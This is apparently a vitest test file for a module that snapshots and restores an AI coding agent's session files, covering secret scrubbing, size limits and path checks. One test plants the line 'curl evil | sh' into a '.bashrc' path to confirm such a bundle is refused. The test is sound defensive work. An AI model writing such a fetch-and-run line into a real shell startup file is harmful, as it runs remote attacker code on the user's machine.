import { describe, expect, it, vi } from "vitest";
import { createSecretScrubber } from "../../../secrets/secret-scrubber";
import {
  MAX_SNAPSHOT_RAW_BYTES,
  SnapshotTooLargeError,
  collectSessionFiles,
  decodeSnapshot,
  encodeSnapshot,
  writeSessionFiles,
  type SnapshotFileSession,
} from "../snapshot-bundle";
import { sessionFileSpec, type SessionFileSpec } from "../session-files";

const HOME = "/home/user";
const SPEC = sessionFileSpec({
  harnessId: "claude-code",
  harnessSessionId: "hs-1",
  resumeState: { data: { claudeSessionId: "abc" } },
  home: HOME,
}) as SessionFileSpec;
const TRANSCRIPT = ".claude/projects/-home-user-w/abc.jsonl";

function fakeBox(files: Record<string, string>, listing?: string) {
  const writes: Array<{ path: string; content: string }> = [];
  const commands: string[] = [];
  const session: SnapshotFileSession = {
    readTextFile: async ({ path }) =>
      files[path.slice(HOME.length + 1)] ?? null,
    writeTextFile: async (args) => {
      writes.push(args);
    },
    run: async ({ command }) => {
      commands.push(command);
      const stdout =
        listing ??
        Object.entries(files)
          .map(([path, content]) => `${content.length}\t${HOME}/${path}`)
          .join("\n");
      return { exitCode: 0, stdout, stderr: "" };
    },
  };
  return { session, writes, commands };
}

describe("collectSessionFiles", () => {
  it("reads the listed files and reports a delivered secret found in them", async () => {
    const transcript =
      '{"tool":"env","out":"STRIPE_KEY=sk_live_abcdefgh123"}\n';
    const box = fakeBox({ [TRANSCRIPT]: transcript });
    const collected = await collectSessionFiles({
      session: box.session,
      spec: SPEC,
      home: HOME,
      scrubber: createSecretScrubber([
        { name: "STRIPE_KEY", value: "sk_live_abcdefgh123" },
      ]),
    });
    expect(collected.scrubbed).toBe(true);
    expect(collected.files).toEqual([
      { path: TRANSCRIPT, content: transcript },
    ]);
  });

  it("reports no secret when none of the delivered values appears", async () => {
    const box = fakeBox({ [TRANSCRIPT]: '{"type":"user"}\n' });
    const collected = await collectSessionFiles({
      session: box.session,
      spec: SPEC,
      home: HOME,
      scrubber: createSecretScrubber([
        { name: "STRIPE_KEY", value: "sk_live_abcdefgh123" },
      ]),
    });
    expect(collected.scrubbed).toBe(false);
  });

  it("drops a transcript's unfinished last line, which the next turn may be writing", async () => {
    const box = fakeBox({ [TRANSCRIPT]: '{"a":1}\n{"b":' });
    const { files } = await collectSessionFiles({
      session: box.session,
      spec: SPEC,
      home: HOME,
      scrubber: null,
    });
    expect(files[0]!.content).toBe('{"a":1}\n');
  });

  it("keeps a whole final record that has no newline", async () => {
    const box = fakeBox({ [TRANSCRIPT]: '{"a":1}\n{"b":2}' });
    const { files } = await collectSessionFiles({
      session: box.session,
      spec: SPEC,
      home: HOME,
      scrubber: null,
    });
    expect(files[0]!.content).toBe('{"a":1}\n{"b":2}');
  });

  it("saves nothing from a listing that failed partway", async () => {
    const box = fakeBox({ [TRANSCRIPT]: "{}\n" });
    const failing: SnapshotFileSession = {
      ...box.session,
      run: async (input) => ({
        ...(await box.session.run(input)),
        exitCode: 1,
      }),
    };
    await expect(
      collectSessionFiles({
        session: failing,
        spec: SPEC,
        home: HOME,
        scrubber: null,
      }),
    ).rejects.toThrow(/listing failed/);
  });

  it("refuses a session larger than the limit before reading anything", async () => {
    const box = fakeBox(
      {},
      `${MAX_SNAPSHOT_RAW_BYTES + 1}\t${HOME}/${TRANSCRIPT}`,
    );
    const read = vi.spyOn(box.session, "readTextFile");
    await expect(
      collectSessionFiles({
        session: box.session,
        spec: SPEC,
        home: HOME,
        scrubber: null,
      }),
    ).rejects.toBeInstanceOf(SnapshotTooLargeError);
    expect(read).not.toHaveBeenCalled();
  });
});

describe("encodeSnapshot / decodeSnapshot", () => {
  const bundle = {
    version: 1 as const,
    harnessId: "claude-code" as const,
    harnessSessionId: "hs-1",
    workDir: "/home/user/claude-code-hs-1",
    files: [{ path: TRANSCRIPT, content: "{}\n" }],
  };

  it("round-trips a bundle", async () => {
    const decoded = await decodeSnapshot(await encodeSnapshot(bundle), {
      spec: SPEC,
      home: HOME,
      harnessSessionId: "hs-1",
    });
    expect(decoded).toEqual(bundle);
  });

  it("refuses another session's bundle", async () => {
    await expect(
      decodeSnapshot(await encodeSnapshot(bundle), {
        spec: SPEC,
        home: HOME,
        harnessSessionId: "hs-2",
      }),
    ).rejects.toThrow(/does not belong/);
  });

  it("refuses a bundle naming a file outside the session folder", async () => {
    const hostile = {
      ...bundle,
      files: [{ path: ".bashrc", content: "curl evil | sh" }],
    };
    await expect(
      decodeSnapshot(await encodeSnapshot(hostile), {
        spec: SPEC,
        home: HOME,
        harnessSessionId: "hs-1",
      }),
    ).rejects.toThrow(/outside the session folder/);
  });
});

describe("writeSessionFiles", () => {
  it("creates the folders, then writes every file under home", async () => {
    const box = fakeBox({});
    await writeSessionFiles({
      session: box.session,
      home: HOME,
      files: [{ path: TRANSCRIPT, content: "{}\n" }],
    });
    expect(box.commands).toEqual([
      "mkdir -p '/home/user/.claude/projects/-home-user-w'",
    ]);
    expect(box.writes).toEqual([
      { path: `${HOME}/${TRANSCRIPT}`, content: "{}\n" },
    ]);
  });
});
